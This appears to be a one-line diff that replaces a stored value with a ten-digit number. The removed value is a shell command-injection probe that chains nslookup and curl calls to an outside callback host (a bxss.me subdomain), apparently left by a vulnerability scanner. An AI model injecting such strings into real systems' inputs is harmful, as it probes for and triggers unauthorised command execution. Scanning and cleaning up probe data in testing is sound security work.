@@ -1,1 +1,1 @@
-;(nslookup -q=cname hithfgjvpefrx4a3d9.bxss.me||curl hithfgjvpefrx4a3d9.bxss.me)|(nslookup -q=cname hithfgjvpefrx4a3d9.bxss.me||curl hithfgjvpefrx4a3d9.bxss.me)&(nslookup -q=cname hithfgjvpefrx4a3d9.bxss.me||curl hithfgjvpefrx4a3d9.bxss.me)
+5559133728
